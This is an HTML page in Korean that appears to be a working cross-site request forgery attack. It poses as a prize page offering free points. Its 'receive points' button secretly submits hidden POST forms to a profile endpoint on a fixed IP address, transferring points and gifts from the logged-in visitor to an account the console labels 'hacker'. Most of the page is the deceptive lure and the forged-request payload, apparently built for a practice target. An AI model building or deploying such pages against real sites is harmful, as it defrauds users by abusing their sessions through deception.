<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 무료 포인트 받기</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            color: white;
        }
        .gift-container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 50px;
            border-radius: 20px;
            box-shadow: 0 8px 32px rgba(31, 38, 135, 0.37);
        }
        .gift-box {
            font-size: 8em;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-20px); }
            60% { transform: translateY(-10px); }
        }
        .message {
            font-size: 1.5em;
            margin: 20px 0;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
        }
        .auto-message {
            font-size: 1.2em;
            color: #FFD700;
            margin-top: 30px;
        }
        .login-button {
            background: linear-gradient(45deg, #FF6B6B, #FF8E53);
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            color: white;
            font-size: 1.2em;
            cursor: pointer;
            margin: 20px 10px;
            transition: transform 0.3s;
        }
        .login-button:hover {
            transform: scale(1.05);
        }
        .attack-button {
            background: linear-gradient(45deg, #00FF88, #00CC66);
            border: none;
            padding: 15px 30px;
            border-radius: 25px;
            color: white;
            font-size: 1.2em;
            cursor: pointer;
            margin: 20px 10px;
            transition: transform 0.3s;
        }
        .attack-button:hover {
            transform: scale(1.05);
        }
    </style>
</head>
<body>
    <div class="gift-container">
        <div class="gift-box">🎁</div>
        <h1>축하합니다!</h1>
        <p class="message">🎉 특별 이벤트에 당첨되셨습니다!</p>
        
        <div id="status" style="margin-top: 30px;">
            <p class="auto-message">🔐 로그인 후 이용해주세요</p>
            
            <button class="login-button" onclick="openLoginAndReturn()">
                🚪 로그인하고 오기
            </button>
            
            <button class="attack-button" onclick="executeAttack()">
                💰 포인트 지급 받기
            </button>
            
            <p style="font-size: 0.9em; margin-top: 20px;">
                ⚠️ 로그인된 상태에서 "포인트 지급 받기"를 클릭하세요!
            </p>
        </div>
    </div>

    <script>
        let attackCount = 0;
        
        function openLoginAndReturn() {
            console.log('🚪 로그인 창 열기');
            window.open('http://3.36.66.216/login.php', '_blank');
        }
        
        function executeAttack() {
            attackCount++;
            console.log('🎯 공격 실행 #' + attackCount);
            
            const statusEl = document.getElementById('status');
            
            statusEl.innerHTML = '<p style="color: #FFD700;">⚡ 포인트 전송 중...</p>';
            
            // 즉시 공격 실행 (CORS 체크 없이)
            executeDirectAttack();
            
            setTimeout(() => {
                statusEl.innerHTML = `
                    <p style="color: #00FF88; font-size: 1.3em;">✅ 전송 완료!</p>
                    <p>💰 포인트 요청이 전송되었습니다</p>
                    <div style="margin-top: 20px;">
                        <button class="attack-button" onclick="executeAttack()" style="margin: 5px;">
                            🔄 다시 시도
                        </button>
                        <br>
                        <a href="http://3.36.66.216" target="_blank" style="color: #FFD700; text-decoration: none;">
                            🔍 결과 확인하러 가기 →
                        </a>
                    </div>
                `;
            }, 2000);
        }
        
        function executeDirectAttack() {
            console.log('🚀 직접 공격 실행');
            
            const attacks = [
                { points: 100, gift_type: 'diamond', message: 'Direct_Attack_' + attackCount + '_1' },
                { points: 75, gift_type: 'coffee', message: 'Direct_Attack_' + attackCount + '_2' },
                { points: 50, gift_type: 'cake', message: 'Direct_Attack_' + attackCount + '_3' }
            ];
            
            attacks.forEach((attack, index) => {
                setTimeout(() => {
                    createAndSubmitForm(attack, attackCount + '_' + (index + 1));
                    console.log('📤 공격 ' + (index + 1) + ' 전송: ' + attack.points + 'P');
                }, index * 500);
            });
        }
        
        function createAndSubmitForm(attack, id) {
            // Form 생성
            const form = document.createElement('form');
            form.method = 'POST';
            form.action = 'http://3.36.66.216/profile.php';
            form.target = 'result_' + id;
            form.style.display = 'none';
            
            // 결과 확인용 iframe (선택사항)
            const iframe = document.createElement('iframe');
            iframe.name = 'result_' + id;
            iframe.style.display = 'none';
            iframe.style.width = '1px';
            iframe.style.height = '1px';
            document.body.appendChild(iframe);
            
            // 필드 추가
            const fields = {
                receiver_id: '13',
                points: attack.points,
                send_gift: '1',
                gift_type: attack.gift_type,
                message: attack.message
            };
            
            for (let key in fields) {
                const input = document.createElement('input');
                input.type = 'hidden';
                input.name = key;
                input.value = fields[key];
                form.appendChild(input);
            }
            
            // Form 전송
            document.body.appendChild(form);
            form.submit();
            
            // 정리
            setTimeout(() => {
                if (form.parentNode) form.parentNode.removeChild(form);
                if (iframe.parentNode) iframe.parentNode.removeChild(iframe);
            }, 10000);
        }
        
        console.log('🎁 수동 실행 CSRF 공격 시스템');
        console.log('🎯 타겟: hacker (ID: 13)');
        console.log('💡 사용법: 로그인 후 포인트 지급 받기 클릭');
    </script>
</body>
</html>
